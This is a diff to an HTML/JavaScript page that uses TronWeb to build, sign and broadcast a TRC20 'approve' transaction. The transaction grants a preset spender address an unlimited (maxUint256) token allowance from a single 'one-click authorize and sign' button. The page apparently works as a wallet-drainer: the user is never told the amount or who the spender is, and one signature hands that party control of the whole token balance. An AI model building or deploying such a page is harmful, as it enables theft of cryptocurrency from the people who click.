@@ -7,7 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
-    <h1>TRC20代币授权（自动跳转签名）</h1>
+    <h1>TRC20代币授权（自动跳转签名页面）</h1>
     <button id="authorizeBtn">一键授权并签名</button>
 
     <script>
@@ -22,14 +22,27 @@
             }
 
             try {
-                const contract = await tronWeb.contract().at(trc20ContractAddress);
+                // 构建交易数据
+                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                    trc20ContractAddress,
+                    'approve(address,uint256)',
+                    {
+                        feeLimit: 10000000,
+                        callValue: 0
+                    },
+                    [
+                        { type: 'address', value: spenderAddress },
+                        { type: 'uint256', value: maxUint256 }
+                    ]
+                );
 
-                // 直接发起授权请求，自动跳转到签名页面
-                const result = await contract.approve(spenderAddress, maxUint256).send({
-                    shouldPollResponse: true // 自动等待响应，直接触发签名
-                });
+                // 使用tronLink请求签名并跳转到签名页面
+                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
 
-                alert('授权成功！交易ID: ' + result);
+                // 发送交易
+                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+                alert('授权成功！交易ID: ' + result.txid);
             } catch (error) {
                 console.error('授权失败', error);
                 alert('授权失败，请重试');
